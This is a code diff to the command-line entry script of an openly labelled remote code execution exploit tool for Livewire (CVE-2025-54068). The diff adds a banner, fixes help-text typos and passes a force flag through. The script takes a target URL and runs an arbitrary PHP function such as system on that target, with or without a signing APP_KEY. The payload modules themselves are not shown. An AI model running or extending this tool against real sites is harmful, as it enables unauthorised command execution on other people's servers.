@@ -4,11 +4,13 @@ import argparse
 import warnings
 warnings.filterwarnings("ignore")
 
+from exploit.exploit import print_banner
 from exploit.exploit_appkey import ExploitWithAppKey
 from exploit.exploit_wappkey import ExploitWithoutAppKey
 
 def main():
-    parser = argparse.ArgumentParser(description="Livewire exploit tool")
+    print_banner()
+    parser = argparse.ArgumentParser(description="Noir - Livewire RCE Exploit (CVE-2025-54068)")
     parser.add_argument("-u", "--url", help="Target URL", required=True)
     parser.add_argument("-f", "--function", help="Function to execute (default: system)", default="system")
     parser.add_argument("-p", "--param", help="Param for function (default: id)", default="id")
@@ -16,12 +18,12 @@ def main():
     parser.add_argument("-P", "--proxy", help="Proxy URL for requests", default=None)
     parser.add_argument("-a", "--app-key", help="APP_KEY to sign snapshot", default=None)
     parser.add_argument("-d", "--debug", help="Enable debug output", action="store_true")
-    parser.add_argument("-F", "--force", help="Force exploit even if version does not seems to be vulnerable", action="store_true")
-    parser.add_argument("-c", "--check", help="Only check if the remote target is vulnerable (only revelant for the exploit without the APP_KEY)", action="store_true")
+    parser.add_argument("-F", "--force", help="Force exploit even if version does not seem to be vulnerable", action="store_true")
+    parser.add_argument("-c", "--check", help="Only check if the remote target is vulnerable (only relevant for the exploit without the APP_KEY)", action="store_true")
 
     args = parser.parse_args()
     if args.app_key is not None:
-        exploit = ExploitWithAppKey(args.url, args.debug, args.function, args.param, args.headers, args.proxy, args.app_key)
+        exploit = ExploitWithAppKey(args.url, args.debug, args.function, args.param, args.headers, args.proxy, args.app_key, args.force)
     else:
         exploit = ExploitWithoutAppKey(args.url, args.debug, args.function, args.param, args.headers, args.proxy, args.check, args.force)
     exploit.run()
